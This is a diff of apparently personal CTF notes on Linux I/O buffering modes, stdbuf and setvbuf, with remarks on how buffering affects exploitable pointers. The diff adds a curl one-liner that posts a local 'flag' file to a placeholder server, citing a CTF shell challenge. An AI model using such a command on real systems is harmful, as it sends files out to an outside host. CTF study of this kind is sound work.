@@ -6,7 +6,7 @@
  * /proc/self/exe - 当前程序
 
 # Buffer Mode
-## introduce
+## Introduction
 > The three types of buffering available are unbuffered, block buffered, and line buffered.
 > When an output stream is unbuffered, information appears on the destination file or terminal as soon as written; when it is block buffered many characters are saved up and written as a block; when it is line buffered characters are saved up until a newline is output or input is read from any stream attached to a terminal device (typically stdin).
 > The function `fflush` may be used to force the block out early.
@@ -16,13 +16,13 @@
  * buffer有三种模式：unbuffered, block buffered, line buffered
  * unbuffered - 不缓冲，输入的字符立即输出
  * line buffered - 行缓冲，输入的字符遇到`\n`再输出
- * block buffered - 块缓冲，有时也叫全缓冲，（应该是遇到EOF再输出叭），可使用`fflush`强行输出
+ * block buffered - 块缓冲，有时也叫全缓冲（应该是遇到EOF再输出叭）可使用`fflush`强行输出
  * stdin和stdout默认line buffered
  * stderr默认unbuffered
- * 其他文件描述法默认block buffered（打开的文件用的就是块缓冲模式）
+ * 其他文件描述符默认block buffered（打开的文件用的就是块缓冲模式）
 
 ## stdbuf
-### Introduce
+### Introduction
 > Run COMMAND, with modified buffering operations for its standard streams.
 
 这是一条linux命令，可以以指定的标准文件流缓冲模式运行命令
@@ -67,4 +67,9 @@ setvbuf(stdin,0,2,0);  // 设置stdin的缓冲模式
 
 使用`stdbuf`启动程序，可以避免程序因为使用`setvbuf`造成的相应文件IO指针出现在bss段，从而减少可被利用的点
 
-
+# curl
+通过curl将本地文件发送至目标服务器
+``` bash
+curl -v --data @flag http://your.site:2333
+```
+e.g. [wpictf-shell2](https://github.com/ljagiello/wpictf-2020/tree/master/linux/suckmore-shell-2.0)
